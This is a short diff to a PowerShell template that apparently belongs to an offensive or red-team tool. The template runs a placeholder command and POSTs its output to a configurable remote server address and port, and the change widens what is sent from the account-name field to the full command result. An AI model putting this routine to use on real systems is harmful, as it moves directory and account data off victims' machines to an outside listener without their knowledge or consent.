@@ -229,7 +229,7 @@ $cmd = {command}
 $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/')
 $request.Method = 'POST'
 $request.ContentType = 'application/x-www-form-urlencoded'
-$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd.SamAccountName)
+$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
 $request.ContentLength = $bytes.Length
 $requestStream = $request.GetRequestStream()
 $requestStream.Write($bytes, 0, $bytes.Length)
